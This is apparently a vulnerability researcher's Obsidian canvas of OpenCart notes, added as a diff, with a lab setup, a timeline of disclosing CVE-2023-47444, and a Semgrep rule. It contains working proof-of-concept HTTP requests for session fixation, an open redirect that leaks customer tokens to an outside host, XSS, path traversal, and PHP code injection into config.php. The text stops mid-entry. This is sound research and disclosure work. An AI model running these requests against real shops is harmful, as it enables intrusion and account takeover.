@@ -1,0 +1,552 @@
+{
+  "edges": [
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "top",
+      "id": "427a35b76aa7f49b",
+      "styleAttributes": {
+        "pathfindingMethod": "square"
+      },
+      "toNode": "26a93c7e36d59dc7",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "left",
+      "id": "fa14aabcf6f8045c",
+      "styleAttributes": {
+      },
+      "toNode": "ce573b456236baa2",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "bottom",
+      "id": "75239d7a17720e6d",
+      "styleAttributes": {
+      },
+      "toNode": "bfd937018307d703",
+      "toSide": "top"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "617fd12cc3744546",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "4006fc6337572b1e",
+      "toSide": "top"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "top",
+      "id": "75e236a6bb057ffe",
+      "styleAttributes": {
+        "pathfindingMethod": "square"
+      },
+      "toNode": "7a9075e0d6907e67",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "left",
+      "id": "0402e666a935a1a0",
+      "styleAttributes": {
+      },
+      "toNode": "7429e754d0a422cb",
+      "toSide": "right"
+    },
+    {
+      "fromNode": "7429e754d0a422cb",
+      "fromSide": "left",
+      "id": "685eec0c9a8b277a",
+      "styleAttributes": {
+      },
+      "toNode": "7ca354fd21654453",
+      "toSide": "right"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "bottom",
+      "id": "36b7ae96f96115b3",
+      "styleAttributes": {
+      },
+      "toNode": "f4c3c7183fbfb086",
+      "toSide": "top"
+    },
+    {
+      "color": "2",
+      "fromNode": "f4c3c7183fbfb086",
+      "fromSide": "right",
+      "id": "fda5e75b404e6dba",
+      "label": "related",
+      "styleAttributes": {
+        "path": "dotted"
+      },
+      "toEnd": "none",
+      "toNode": "8cfb2fca32a6a4b3",
+      "toSide": "left"
+    },
+    {
+      "color": "5",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "bottom",
+      "id": "fab473e35a87a341",
+      "styleAttributes": {
+      },
+      "toNode": "c3b5022e0cd777c2",
+      "toSide": "top"
+    },
+    {
+      "color": "5",
+      "fromEnd": "arrow",
+      "fromNode": "c3b5022e0cd777c2",
+      "fromSide": "left",
+      "id": "93cc0aeff045e114",
+      "styleAttributes": {
+        "path": "dotted",
+        "pathfindingMethod": "square"
+      },
+      "toNode": "7ca354fd21654453",
+      "toSide": "bottom"
+    },
+    {
+      "color": "5",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "bottom",
+      "id": "8883c809cc29c924",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "3ffba2a72c15d234",
+      "toSide": "top"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "left",
+      "id": "24ddf5b28f8220ca",
+      "styleAttributes": {
+      },
+      "toNode": "736c9df76795c8a3",
+      "toSide": "top"
+    },
+    {
+      "color": "1",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "cbf8daad04264761",
+      "styleAttributes": {
+        "pathfindingMethod": "a-star"
+      },
+      "toNode": "8e159ebf37163543",
+      "toSide": "left"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "46458ea60041838c",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "5130f72c68fcb44c",
+      "toSide": "left"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "118825796013a0f7",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "488acef427bc0ca2",
+      "toSide": "top"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "07dfd8cc39321be8",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "f0d429c00ed4b383",
+      "toSide": "left"
+    },
+    {
+      "color": "2",
+      "fromNode": "bfd937018307d703",
+      "fromSide": "right",
+      "id": "9f3c91f016697590",
+      "styleAttributes": {
+        "pathfindingMethod": null
+      },
+      "toNode": "0cb9ffa450d0f06c",
+      "toSide": "left"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "right",
+      "id": "74bb4cc0d5fe09ba",
+      "styleAttributes": {
+        "path": "long-dashed",
+        "pathfindingMethod": "a-star"
+      },
+      "toNode": "d8eecf3260e78ee9",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "f3ca64c09118de8a",
+      "fromSide": "right",
+      "id": "1a54d0190c9008c0",
+      "styleAttributes": {
+        "path": "long-dashed"
+      },
+      "toNode": "bd3975130bc38ec9",
+      "toSide": "left"
+    },
+    {
+      "fromEnd": "arrow",
+      "fromNode": "0cb9ffa450d0f06c",
+      "fromSide": "top",
+      "id": "62d3a9e55b07ae45",
+      "styleAttributes": {
+        "path": "dotted"
+      },
+      "toNode": "bd3975130bc38ec9",
+      "toSide": "bottom"
+    },
+    {
+      "fromNode": "bd3975130bc38ec9",
+      "fromSide": "right",
+      "id": "001ce232a6716dfe",
+      "styleAttributes": {
+        "path": null,
+        "pathfindingMethod": "square"
+      },
+      "toNode": "03db9bac6f37c6aa",
+      "toSide": "bottom"
+    }
+  ],
+  "metadata": {
+  },
+  "nodes": [
+    {
+      "height": 4000,
+      "id": "38d37cd36af30a4f",
+      "label": "Known vulnerabilities",
+      "styleAttributes": {
+        "border": null
+      },
+      "type": "group",
+      "width": 5364,
+      "x": -1427,
+      "y": 382
+    },
+    {
+      "height": 2164,
+      "id": "ce573b456236baa2",
+      "label": "Setup",
+      "styleAttributes": {
+      },
+      "type": "group",
+      "width": 1559,
+      "x": -1849,
+      "y": -3002
+    },
+    {
+      "color": "5",
+      "height": 1531,
+      "id": "3ffba2a72c15d234",
+      "styleAttributes": {
+      },
+      "text": "# Session fixation\n\n*admin_secret/controller/startup/session.php*\n*system/framework.php*\n\n```php title:\"admin_secret/controller/startup/session.php\"\n// Require higher security for session cookies\n$option = [\n\t'expires'  => $this->config->get('config_session_expire') ? time() + (int)$this->config->get('config_session_expire') : 0,\n\t'path'     => $this->config->get('session_path'),\n\t'secure'   => $this->request->server['HTTPS'],\n\t'httponly' => false,\n\t'SameSite' => $this->config->get('config_session_samesite')\n];\n\nsetcookie($this->config->get('session_name'), $session->getId(), $option);\n```\n\nReferences:\n- https://github.com/opencart/opencart/issues/12939\n- https://github.com/opencart/opencart/issues/10280\n- ...\n## PoC\n\nCookies are not reset but instead are reflected in server response\n\n```http title:'Cookie are not reset but instead are reflected in server response'\nGET /opencart-latest/admin/index.php HTTP/1.1\nHost: 127.0.0.1\nCache-Control: max-age=0\nCookie: OCSESSID=12345678901234567890123456\nConnection: close\n\n\nHTTP/1.1 200 OK\nDate: Fri, 21 Jul 2023 16:36:37 GMT\nServer: Apache/2.4.57 (Debian)\nSet-Cookie: OCSESSID=12345678901234567890123456; expires=Sat, 22 Jul 2023 16:36:37 GMT; Max-Age=86400; path=/opencart-latest/admin/; SameSite=Strict\n```\n\nAfter a successful login, the old cookie is not refreshed, but the older one is updated:\n\n```http\nPOST /opencart-latest/admin/index.php?route=common/login.login&login_token=582cc2550d2cbfcf0380ba178c462125 HTTP/1.1\nHost: 127.0.0.1\nCookie: OCSESSID=12345678901234567890123456\n\nusername=admin&password=admin\n\n\nHTTP/1.1 200 OK\nDate: Fri, 21 Jul 2023 16:35:47 GMT\nServer: Apache/2.4.57 (Debian)\nSet-Cookie: OCSESSID=12345678901234567890123456; expires=Sat, 22 Jul 2023 16:35:47 GMT; Max-Age=86400; path=/opencart-latest/admin/; SameSite=Strict\n\n{\"redirect\":\"http:\\/\\/127.0.0.1\\/opencart-latest\\/admin\\/index.php?route=common\\/login\"}\n```\n\n",
+      "type": "text",
+      "width": 929,
+      "x": -219,
+      "y": 1590
+    },
+    {
+      "height": 358,
+      "id": "03db9bac6f37c6aa",
+      "styleAttributes": {
+      },
+      "text": "### Semgrep rule for detecting unsafe decoding\n\n```yaml\nrules:\n  - id: urldecode-from-source\n    severity: ERROR\n    languages:\n      - php\n    message: Test\n    patterns:\n      - pattern: $data[...] = urldecode($BOJ->request->$METHOD['...']);\n```",
+      "type": "text",
+      "width": 542,
+      "x": 1730,
+      "y": -1705
+    },
+    {
+      "height": 875,
+      "id": "dd4734ed9c201bfd",
+      "styleAttributes": {
+        "border": "dashed"
+      },
+      "text": "# Arbitrary File Upload in catalog/download.upload\n\n>[!info]\n>Final name can't be guessed and files are uploaded inside the `/storage` folder, usually outside the web root\n\n```http\nPOST /opencart-latest/admin/index.php?route=catalog/download.upload&user_token=c5658692bdafeb7f9c3b049532e07ad6 HTTP/1.1\nHost: 127.0.0.1\n\n------WebKitFormBoundaryFkyBYo2SIWb1a3pb\nContent-Disposition: form-data; name=\"file\"; filename=\"foo2.txt\"\nContent-Type: text/plain\n\nfoo\n\n------WebKitFormBoundaryFkyBYo2SIWb1a3pb--\n\n\nHTTP/1.1 200 OK\n{\"filename\":\"foo2.txt.e9d3b468bde9b84aea3e6d7884e24ab7\",\"mask\":\"foo2.txt\",\"success\":\"Your file was successfully uploaded!\"}\n```\n\nLog:\n```\nFile uploaded on `/var/www/html/opencart-latest/system/storage/download`\n\nname: foo2.txt\ntmp_name: /tmp/phpEVfTNf\nfilename: foo2.txt\nfile: foo2.txt.e9d3b468bde9b84aea3e6d7884e24ab7\n```\n\nFile can be downloaded using\n```http\nGET /admin_secret/index.php?route=catalog/download.download&user_token=bfd88496b05c083737fcc83d21a66e84&filename=application-x-addon.png.881efb1332597a33d23dad5008361bcb\nHost: localhost\n\n\nHTTP/1.1 200 OK\nontent-Description: File Transfer\nContent-Disposition: attachment; filename=\"application-x-addon.png.881efb1332597a33d23dad5008361bcb\"\n```\n",
+      "type": "text",
+      "width": 921,
+      "x": 2385,
+      "y": -2890
+    },
+    {
+      "color": "2",
+      "height": 1173,
+      "id": "736c9df76795c8a3",
+      "styleAttributes": {
+      },
+      "text": "# Parameter pollution + Open Redirection + token leak\n\nReferences:\n- https://forum.opencart.com/viewtopic.php?t=105805\n- \n\n*catalog/controller/account/login.php*\n\n```php title:'catalog/controller/account/login.php'\npublic function login(): void {\n...\n\tif (isset($this->session->data['redirect'])) {\n\t\t$data['redirect'] = $this->session->data['redirect'];\n\t\tunset($this->session->data['redirect']);\n\t} elseif (isset($this->request->get['redirect'])) {\n\t\t$data['redirect'] = urldecode($this->request->get['redirect']); // source\n\t} else {\n\t\t$data['redirect'] = '';\n\t}\n\t...\n\t// Create customer token\n\t$this->session->data['customer_token'] = oc_token(26);\n\t$this->model_account_customer->deleteLoginAttempts($this->request->post['email']);\n\t// Added strpos check to pass McAfee PCI compliance test (http://forum.opencart.com/viewtopic.php?f=10&t=12043&p=151494#p151295)\n\tif (isset($this->request->post['redirect']) && (strpos($this->request->post['redirect'], $this->config->get('config_url')) !== false)) {\n\t\t$json['redirect'] = str_replace('&amp;', '&', $this->request->post['redirect']) . '&customer_token=' . $this->session->data['customer_token'];\n\t} else {\n\t\t$json['redirect'] = $this->url->link('account/account', 'language=' . $this->config->get('config_language') . '&customer_token=' . $this->session->data['customer_token'], true);\n\t}\n...\n```\n\n## PoC\n\n## Parameter Pollution\n\nhttp://localhost//index.php?route=account/login&language=en-gbr&redirect=http://0xbro.red/?http://localhost/opencart-latest/index.php?route=account/download\n\n```http\nGET /index.php?route=account/login&language=en-gbr&redirect=http://0xbro.red/?http://localhost/opencart-latest/index.php?route=account/download HTTP/1.1\nHost: localhost\n\n\nHTTP/1.1 200 OK\n<input type=\"hidden\" name=\"code\" value=\"\"/> <input type=\"hidden\" name=\"redirect\" value=\"http://localhost/index.php?route=account/login&amp;language=en-gbr&amp;redirect=http://0xbro.red/?http://localhost/opencart-latest/index.php?route=account/download\"/>\n</form>\n```\n\n## Open Redirection\n\n\n```http\nPOST /opencart-latest/index.php?route=account/login.login&language=en-gb&login_token=51ff83a8903ae28b28d8ab9f7d HTTP/1.1\nHost: localhost\nContent-Length: 168\n\nemail=customer1%40opencart.com&password=customer1&redirect=http%3A%2F%2F0xbro.red%2F%3Fhttp%3A%2F%2Flocalhost%2Fopencart-latest%2Findex.php%3Froute%3Daccount%2Fdownload\n\n\n\nHTTP/1.1 200 OK\n{\"redirect\":\"http:\\/\\/0xbro.red\\/?http:\\/\\/localhost\\/opencart-latest\\/index.php?route=account\\/download&customer_token=6b477d397c440f16f7742f6517\"}\n```",
+      "type": "text",
+      "width": 1060,
+      "x": -1371,
+      "y": 1811
+    },
+    {
+      "color": "1",
+      "height": 1605,
+      "id": "8e159ebf37163543",
+      "styleAttributes": {
+      },
+      "text": "# Static Code Injection in common/security.admin - CVE-2023-47444 (pt. 2)\n\n>[!info]\n>The vulnerability can be exploited only if the admin path is still the default\n\n*admin/controller/common/security.php*\n```php title:'admin/controller/common/security.php'\npublic function admin(): void {\n\tif (isset($this->request->get['page'])) {\n\t\t\t$page = (int)$this->request->get['page'];\n\t\t} else {\n\t\t\t$page = 1;\n\t\t}\n\n\t\tif (isset($this->request->get['name'])) {\n\t\t\t$name = preg_replace('[^a-zA-z0-9]', '', basename(html_entity_decode(trim((string)$this->request->get['name']), ENT_QUOTES, 'UTF-8')));\n\t\t} else {\n\t\t\t$name = 'admin';\n\t\t}\n\t\t$json = [];\n\t\tif ($this->user->hasPermission('modify', 'common/security')) {\n\t\t\t...\n\t\t}\n\t}esle{\n\t\t//error\n\t}\n\tif (!$json) {\n\t\t// 1.  // 1. We need to copy the files, as rename cannot be used on any directory, the executing script is running under\n\t\t...\n\t\t// Add the file to the files to be deleted array\n\t\t// 2. Create the new admin folder name\n\t\tif (!is_dir($base_new)) {\n\t\t\tmkdir($base_new, 0777);\n\t\t}\n\t\t// 3. split the file copies into chunks.\n\t\t$total = count($files);\n\t\t$limit = 200;\n\t\t$start = ($page - 1) * $limit;\n\t\t$end = $start > ($total - $limit) ? $total : ($start + $limit);\n\n\t\t// 4. Copy the files across\n\t\t...\n\t\tif (($page * $limit) <= $total) {\n\t\t\t// redirect\n\t\t} else {\n\t\t\t// Update the old config files\n\t\t\t$file = $base_new . 'config.php';\n\t\t\t$output = '';\n\t\t\t$lines = file($file);\n\t\t\tforeach ($lines as $line_id => $line) {\n\t\t\t\t$status = true;\n\n\t\t\t\tif (strpos($line, 'define(\\'HTTP_SERVER') !== false) {\n\t\t\t\t\t$output .= 'define(\\'HTTP_SERVER\\', \\'' . substr(HTTP_SERVER, 0, strrpos(HTTP_SERVER, '/admin/')) . '/' . $name . '/\\');' . \"\\n\"; // RCE!\n\t\t\t\t\t$status = false;\n\t\t\t\t}\n\n\t\t\t\tif (strpos($line, 'define(\\'DIR_APPLICATION') !== false) {\n\t\t\t\t\t$output .= 'define(\\'DIR_APPLICATION\\', DIR_OPENCART . \\'' . $name . '/\\');' . \"\\n\"; // RCE!\n\t\t\t\t\t$status = false;\n\t\t\t\t}\n\n\t\t\t\tif ($status) {\n\t\t\t\t\t$output .= $line;\n\t\t\t\t}\n\t\t\t}\n\t\t\t// write file\n\t\t}\n\t}\n}\n```\n\n# PoC\n\n\n```http\nGET /opencart-latest/admin/index.php?route=common/security.admin&page=10&user_token=3cf1fa8ece0d0edce6354eab30d7d932&name=admin1');phpinfo();%23 HTTP/1.1\n\nHTTP/1.1 200 OK\n{\"redirect\":\"http:\\/\\/127.0.0.1\\/opencart-latest\\/admin1');phpinfo();#\\/index.php?route=common\\/login\"}\n```\n\n```php title:config.php\n...\n// HTTP\ndefine('HTTP_SERVER', 'http://127.0.0.1/opencart-latest/admin1');phpinfo();#/');\n...\ndefine('DIR_APPLICATION', DIR_OPENCART . 'admin1');phpinfo();#/');\n...\n```\n",
+      "type": "text",
+      "width": 1706,
+      "x": 823,
+      "y": 2547
+    },
+    {
+      "color": "2",
+      "height": 576,
+      "id": "0cb9ffa450d0f06c",
+      "styleAttributes": {
+      },
+      "text": "# Multiple XSS\n\n[CVE-2024-21515](https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266573) - Fixed (?)\n\n```\n/admin/index.php?route=tool/log.download&filename=error.log%3Cimg+src%3D1+onerror%3Dalert%281%29%3E\n```\n\n[CVE-2024-21516](https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266576)\n\n```\n/admin/index.php?route=common/filemanager.list&directory=demo%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden\n```\n\n[CVE-2024-21517](https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266577)\n\n```\n/index.php?route=account/login&language=en-gb&redirect=%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden\n```\n\n",
+      "type": "text",
+      "width": 1087,
+      "x": 2026,
+      "y": 520
+    },
+    {
+      "color": "2",
+      "height": 597,
+      "id": "4006fc6337572b1e",
+      "styleAttributes": {
+        "border": null
+      },
+      "text": "# CVE-2020-10596 - Stored XSS in common/filemanager.list\n\nReferences:\nhttps://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-571935\nhttps://github.com/opencart/opencart/issues/7810\nhttps://github.com/opencart/opencart/issues/7974\nhttps://www.exploitalert.com/view-details.html?id=35634\n\n```http\nPOST /opencart-latest/opencart/admin_secret/index.php?route=common/filemanager.upload&user_token=dc9212bb7217a3336fa53f75169be7b6 HTTP/1.1\n...\nContent-Disposition: form-data; name=\"file[]\"; filename=\"\\\"><svg onload=alert(\\\"XSS_By_Kailash\\\")\n```\n\n![xss_CVE-2020-13980](Play%20ground/Targets/opencart/attachments/xss_CVE-2020-13980.png)",
+      "type": "text",
+      "width": 1042,
+      "x": 909,
+      "y": 1811
+    },
+    {
+      "color": "2",
+      "height": 370,
+      "id": "f0d429c00ed4b383",
+      "styleAttributes": {
+      },
+      "text": "# CVE-2024-21518 Zip Slip\n\nThis affects versions of the package opencart/opencart from 4.0.0.0. A Zip Slip issue was identified via the marketplace installer due to improper sanitization of the target path, allowing files within a malicious archive to traverse the filesystem and be extracted to arbitrary locations. An attacker can create arbitrary files in the web root of the application and overwrite other existing files by exploiting this vulnerability.\n\nhttps://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266578",
+      "type": "text",
+      "width": 624,
+      "x": 2026,
+      "y": 1142
+    },
+    {
+      "color": "2",
+      "height": 253,
+      "id": "5130f72c68fcb44c",
+      "styleAttributes": {
+      },
+      "text": "# CVE-2024-21519 - Arbitrary File Creation\n\nAn Arbitrary File Creation issue was identified via the database restoration functionality. By injecting PHP code into the database, an attacker with admin privileges can create a backup file with an arbitrary filename (including the extension), within `/system/storage/backup`.\n\nhttps://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266579\n",
+      "type": "text",
+      "width": 903,
+      "x": 2026,
+      "y": 1548
+    },
+    {
+      "color": "2",
+      "height": 1164,
+      "id": "8cfb2fca32a6a4b3",
+      "styleAttributes": {
+      },
+      "text": "# Path Traversal in common/filemanager.list\n\n\n```php title:\"admin/controller/common/filemanager.php\"\npublic function list(): void {\n...\n// Make sure we have the correct directory\nif (isset($this->request->get['directory'])) {\n\t$directory = $base . html_entity_decode($this->request->get['directory'], ENT_QUOTES, 'UTF-8') . '/';\n\tprint_r(\"directory: \".$directory.\"\\n\\n\");\n} else {\n\t$directory = $base;\n}\n...\n$allowed = [\n'.ico',\n'.jpg',\n'.jpeg',\n'.png',\n'.gif',\n'.webp',\n'.JPG',\n'.JPEG',\n'.PNG',\n'.GIF'\n];\n...\n// Get directories\n$paths = glob($directory . $filter_name . '*{/,.ico,.jpg,.jpeg,.png,.gif,.webp,.JPG,.JPEG,.PNG,.GIF}', GLOB_BRACE);\nprint_r($paths);\n```\n\nWe can read and list folders and files having an allowed extension\n\n\n```http\nGET /opencart-latest/admin/index.php?route=common/filemanager.list&user_token=c5658692bdafeb7f9c3b049532e07ad6&directory=demo/../../../../../../../../../home/kali/Pictures\n\n\n\nHTTP/1.1 200 OK\ndirectory: /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/\n\nArray\n(\n    [0] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/poc/\n    [1] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/src-bckp/\n    [2] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/download.jpeg\n    [3] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/test1.jpeg\n    [4] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/test2.jpeg\n    [5] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/test3.jpeg\n    [6] => /var/www/html/opencart-latest/image/catalog/demo/../../../../../../../../../home/kali/Pictures/Screenshot_2023-06-01_18_34_32.png\n)\n```",
+      "type": "text",
+      "width": 1042,
+      "x": 2529,
+      "y": -979
+    },
+    {
+      "height": 1904,
+      "id": "92e32a46f4f10ca5",
+      "styleAttributes": {
+        "border": "invisible"
+      },
+      "text": "# Docker environment setup\nEverything inside the same folder:\n```yml title:docker-compose.yml\nversion: '3'\nservices:\n  opencart:\n    build: \n      dockerfile: Dockerfile\n    user: root\n    ports:\n      - \"80:80\"\n    volumes:\n      - ./upload:/var/www/html:rw\n    depends_on:\n      - mysql\n    command: >\n      bash -c \"if [ ! -f /var/www/html/install.lock ]; then\n                 wait-for-it mysql:3306 -t 60 &&\n                 cp config-dist.php config.php\n                 cp admin/config-dist.php admin/config.php\n                 chown 1000:1000 config.php\n                 chown 1000:1000 admin/config.php\n                 php /var/www/html/install/cli_install.php install --username admin --password admin --email email@example.com --http_server http://localhost/ --db_driver mysqli --db_hostname mysql --db_username root --db_password opencart --db_database opencart --db_port 3306 --db_prefix oc_;\n                 chmod -R 777 /var/www/\n                 touch /var/www/html/install.lock;\n               fi &&\n               apache2-foreground\"\n\n  mysql:\n    image: mysql:5.7\n    ports:\n      - \"3306:3306\"\n    environment:\n      - MYSQL_ROOT_PASSWORD=opencart\n      - MYSQL_DATABASE=opencart\n```\n\n```Dockerfile title:Dockerfile\nFROM php:8.2-apache\n\nRUN apt-get update \\\n  && apt-get install -y \\\n      wait-for-it \\\n      unzip \\\n      libfreetype6-dev \\\n      libjpeg62-turbo-dev \\\n      libpng-dev \\\n      libzip-dev \\\n      libcurl3-dev \\\n\t\t\tlibwebp-dev \\\n  && docker-php-ext-configure gd --with-freetype --with-jpeg --with-webp \\\n  && docker-php-ext-install -j$(nproc) gd zip mysqli curl \\\n  && docker-php-ext-enable gd zip mysqli curl\n\nRUN chmod -R 777 /var/www/\n\nRUN a2enmod rewrite\n```\n\n`upload` folder extracted from https://github.com/opencart/opencart/releases/download/4.0.2.3/opencart-4.0.2.3.zip\n\n>[!warning]\n>Remember to set the right privileges from the host OS after finishing the installation process inside the admin panel\n>```shell\n>$ ls -al\ntotal 60\ndrwxrwxrwx 7 kali     kali     4096 Oct  8 10:10 .\ndrwxrwxr-x 3 kali     kali     4096 Oct  8 10:07 ..\ndrwxr-xr-x 6 www-data www-data 4096 Oct  8 10:10 admin_secret\ndrwxrwxrwx 6 kali     kali     4096 Oct  8 10:07 catalog\n...\ndrwxrwxrwx 6 kali     kali     4096 Oct  8 10:10 system\n>\n>┌──(kali㉿kali)-[~/Projects/OpenCart/opencart/upload]\n>└─$ sudo chmod -R 777 admin_secret\n>```",
+      "type": "text",
+      "width": 1463,
+      "x": -1811,
+      "y": -2967
+    },
+    {
+      "file": "Labs/Lab 2 - Vuln. Research/scans/file-list.txt",
+      "height": 400,
+      "id": "7429e754d0a422cb",
+      "styleAttributes": {
+      },
+      "type": "file",
+      "width": 400,
+      "x": -841,
+      "y": -753
+    },
+    {
+      "color": "5",
+      "height": 234,
+      "id": "c3b5022e0cd777c2",
+      "styleAttributes": {
+      },
+      "text": "# Full path disclosure (everywhere) - CVE-2011-3763\n\n- http://localhost/index.php?route=mail/forgotten&email=\n- http://localhost/system/startup.php\n\n",
+      "type": "text",
+      "width": 916,
+      "x": -1227,
+      "y": 1395
+    },
+    {
+      "color": "#39acac",
+      "height": 1042,
+      "id": "26a93c7e36d59dc7",
+      "styleAttributes": {
+      },
+      "text": "# Time-line\n\n>[!summary] Events and findings timeline:\n>**06/07/2023**: \n>- Set up the environment and started the analysis\n>\n>**25/09/2023**: \n>- Tested and confirmed CVE-2023-2315 - Path Traversal in `log.php`, allowing to clear any writable file\n>- Discovered a Path Traversal in `common/filemanager` which allows to enumerate filesystem's directories\n>- Found an arbitrary file upload in `common/filemanager.upload` but cannot change extensions\n>- Found an arbitrary file upload in `catalog/download.upload` but cannot guess the final name\n>\n>**01/10/2023:**\n>- Tested various bypasses and chains in order to escalate severity for Path Traversal and File upload, but without success\n>- Discovered a Self-Reflected XSS in `catalog/product.form` caused by CKEditor\n>- Noticed that `user_token` is not included in Refer header when GET request are sent cross origin → [Default Referrer-Policy](<https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy#directives:~:text=strict%2Dorigin%2Dwhen%2Dcross%2Dorigin%20(default)>)\n>- Discovered a parameter pollution and open redirection in `account/login.login`\n>- Tested Gift and Coupon functionality: no race condition have been found, it seems that only one code for purchase is allowed. To better investigate...\n>\n>**11/10/2023:**\n>- Discovered a path traversal in `common/security.storage` that allows to copy the content of `/system` anywhere in the filesystem\n>- Discovered a RCE in `common/security.storage` caused because the `config.php` can be overwritten with any arbitrary value\n>\n>**12/10/2023**:\n>- Fixed the PoC so that application keeps working as intended\n> \n>**13/10/2023:**\n>- Discovered a RCE in `common/security.admin` caused because the new `config.php` can be created injected arbitrary PHP code\n>\n>**14/10/2023**:\n>- Finished looking all the `$file` references, without finding anything new\n>- Looked at forgot password, login and registration process, without finding anything suspicious\n>  \n> **17/10/2023**:\n>  - Contacted OpenCart at support@opencart.com\n>\n>**24/10/2023**:\n>- Contacted OpenCart at webmaster@opencart.com\n>\n>**30/10/2023**:\n>- Published a post (https://forum.opencart.com/viewtopic.php?t=232348) on the official OpenCart forum as a final attempt to contact the OpenCart team\n>\n>**02/11/2023**:\n>- Sent a PM to an Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff\n>as a final attempt to contact the OpenCart team.\n>\n>**10/11/2023**: \n>- Assigned CVE-2023-47444\n>\n>- **10/11/2023**: Sent a PM to another Administrator on the official OpenCart forum as a very last resort to contact the OpenCart staff.  \n>- **11/11/2023**: Get a _kindly_ response from an OpenCart Administrator \n>- **14/11/2023**: Public release and opened a GitHub issue ([#12947](https://github.com/opencart/opencart/issues/12947))\n>- **15/11/2023**: Opened a pull request ([#12949](https://github.com/opencart/opencart/pull/12949)) with a hotfix, but closed immediately by administrator. GitHub issue also closed by administrator after having marked it as spam and a “non vulnerability”.\n>- **16/11/2023**: Fix ([#12951](https://github.com/opencart/opencart/pull/12951)) merged to master\n\n\n\n",
+      "type": "text",
+      "width": 1164,
+      "x": -169,
+      "y": -2703
+    },
+    {
+      "height": 325,
+      "id": "bfd937018307d703",
+      "styleAttributes": {
+        "border": "invisible"
+      },
+      "text": "# Known CVEs and vulnerabilities\n\n- [https://osv.dev/list?q=opencart&ecosystem=](https://osv.dev/list?q=opencart&ecosystem=)\n- [https://notcve.org/search.php?query=opencart](https://notcve.org/search.php?query=opencart)\n- [https://cvefeed.io/vuln/vendor/895/a-opencart/](https://cvefeed.io/vuln/vendor/895/a-opencart/)\n- [https://app.opencve.io/cve/?tag=&cvss=&search=opencart](https://app.opencve.io/cve/?tag=&cvss=&search=opencart)\n- [https://nvd.nist.gov/vuln/search/results?query=opencart](https://nvd.nist.gov/vuln/search/results?query=opencart)\n- [https://www.cvedetails.com/vulnerability-list/vendor_id-9599/Opencart.html](https://www.cvedetails.com/vulnerability-list/vendor_id-9599/Opencart.html)\n- [https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=opencart](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=opencart)",
+      "type": "text",
+      "width": 744,
+      "x": -183,
+      "y": -277
+    },
+    {
+      "color": "2",
+      "height": 228,
+      "id": "f4c3c7183fbfb086",
+      "styleAttributes": {
+        "border": null
+      },
+      "text": "# CVE-2013-1891\nhttps://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-2935892\nhttps://seclists.org/fulldisclosure/2013/Mar/176\n\nFix (?):\nhttps://github.com/opencart/opencart/commit/3aa1e1b371e35b7a04a471501b7e4cf3712efdf8\n",
+      "type": "text",
+      "width": 872,
+      "x": -183,
+      "y": 868
+    },
+    {
+      "color": "5",
+      "height": 839,
+      "id": "97a7ff10217f42c6",
+      "styleAttributes": {
+      },
